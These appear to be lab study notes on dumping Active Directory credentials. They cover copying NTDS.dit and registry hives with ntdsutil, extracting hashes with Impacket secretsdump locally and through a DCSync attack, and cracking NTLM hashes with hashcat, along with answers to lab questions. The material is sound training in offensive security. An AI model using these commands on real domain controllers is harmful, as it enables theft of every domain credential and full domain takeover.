
## NTDS Domain Controller
The **NTDS** database stores all Active Directory (AD) information, such as:

- **Objects** (users, computers, groups, etc.)
- **Attributes** (object properties)
- **Credentials** (hashed passwords, etc.)

---
 **Structure of NTDS.DIT**
 The data in the NTDS.DIT file is organized into three tables:

1. **Schema Table:** Defines types of objects (e.g., users, groups) and their relationships.
2. **Link Table:** Stores attributes of objects and their values.
3. **Data Table:** Contains actual data, such as user and group details.

---
 **File Location and Protection**

- **Default Location:** `C:\Windows\NTDS\NTDS.DIT`.
- **Protection:** The file is **encrypted** and actively used by Active Directory, meaning it’s **locked** and cannot be accessed directly while the system is running.

---
**Accessing the NTDS.DIT File**
To access and decrypt the NTDS.DIT file, follow these steps:

1. **Copying the NTDS.DIT File:**
You can use tools like:
- **`ntdsutil`:** A built-in utility to manage AD data.
- **`diskshadow`:** A tool to create shadow copies of locked files, like NTDS.DIT.

These tools allow you to make a **copy** of the file without directly accessing the locked database.

2. **Dumping the File's Content:**
After obtaining the file, you need to decrypt its contents to extract sensitive data, such as password hashes.

---
3. **Decrypting the NTDS.DIT File**
To decrypt the NTDS.DIT file, you also need the **System Boot Key** because:
- The Boot Key is required to decrypt **LSA Isolated Credentials** stored in the *NTDS.DIT* and is stored in the **SECURITY file** of the file system, which must also be dumped.

---


## Local Dumping (No Credentials)
This is usually done if you have no credentials available but have administrator access to the domain controller. Therefore, we will be relying on Windows utilities to dump the NTDS file and crack them offline. As a requirement, first, we assume we have administrator access to a domain controller. 

To successfully dump the content of the NTDS file we need the following files:
- *C:\Windows\NTDS\ntds.dit*
- *C:\Windows\System32\config\SYSTEM*
- *C:\Windows\System32\config\SECURITY*

The following is a one-liner PowerShell command to dump the NTDS file using the *Ntdsutil* tool in the `C:\temp` directory.

**Ntdsutil**
Ntdsutil is a Windows utility to used manage and maintain Active Directory configurations. It can be used in various scenarios such as 

- Restore deleted objects in Active Directory.
- Perform maintenance for the AD database.
- Active Directory snapshot management.
- Set Directory Services Restore Mode (DSRM) administrator passwords

Dumping the content of the NTDS file from the Victim Machine
```shell-session
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

Now, if we check the `c:\temp` directory, we see two folders: Active Directory and registry, which contain the three files we need. Transfer them to the AttackBox and run the *secretsdump.py* script to extract the hashes from the dumped memory file.

Extract hashes from NTDS Locally
```shell-session
user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -security {path/to/SECURITY} -system {path/to/SYSTEM} -ntds {path/to/ntds.dit} local
```

## Remote Dumping (With Credentials)
In this case, we will be showing how to dump a system and domain controller hashes remotely, which requires credentials, such as passwords or NTLM hashes. We also need credentials for users with administrative access to a domain controller or special permissions as discussed in the DC Sync section.

The *DC Sync* is a popular attack to perform within an Active Directory environment to dump credentials remotely. This attack works when an account (special account with necessary permissions) or AD admin account is compromised that has the following AD permissions:

- Replicating Directory Changes
- Replicating Directory Changes All
- Replicating Directory Changes in Filtered Set

An adversary takes advantage of these configurations to perform domain replication, commonly referred to as "DC Sync", or Domain Controller Sync.

The Persisting AD room uses the Mimikatz tool to perform the DC Synchronisation attack. Let's demonstrate the attack using a different tool, such as the Impacket SecretsDump script.

Performing theDCSync Attack
```shell-session
user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -just-dc {THM.red/AD_Admin_User}@{MACHINE_IP} > output.txt
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
thm.red\thm:1114:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
```

- the `-just-dc` argument is for extracting the NTDS data.
- the `thm.red/AD_Admin_User` is the authenticated domain user in the form of (domain/user).

Note if we are interested to dump only the NTLM hashes, then we can use the `-just-dc-ntlm` argument as follows:

The DC Sync Attack to DumpNTLMHashes
```shell-session
user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -just-dc-ntlm {THM.red/AD_Admin_User}@{MACHINE_IP} > output.txt
```

Once we obtained hashes, we can either use the hash for a specific user to impersonate him or crack the hash using Cracking tools, such `hashcat`. We can use the hashcat `-m 1000` mode to crack the Windows NTLM hashes as follows:

Cracking the Hashes
```shell-session
user@machine$ hashcat -m 1000 -a 0 /path/to/ntlm_hashes.txt /path/to/wordlist/such/as/rockyou.txt
```


## Example
1. Apply the technique discussed in this task to dump the NTDS file **locally** and extract hashes. What is the target system bootkey value? **Note**: Use thm.red/thm as an Active Directory user since it has administrator privileges!

- Dumping the content of the NTDS file from the Victim Machine
```shell-session
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```
- SCP all three dumped files (security/system/ntds) to our attacking machine
- Decrypt using impacket secretsdump.py

	Extract hashes from NTDS Locally
	```shell-session
	user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -security {path/to/SECURITY} -system {path/to/SYSTEM} -ntds {path/to/ntds.dit} local
	```
	![](Pasted%20image%2020241125233401.png)

2. What is the clear-text password for the **bk-admin** username?
	![](Pasted%20image%2020241125235416.png)
Cracking the Hashes
```shell-session
root@m10.10.151.193$ hashcat -m 1000 -a 0 /bk-admin_hashes.txt /usr/share/wordlists/rockyou.txt
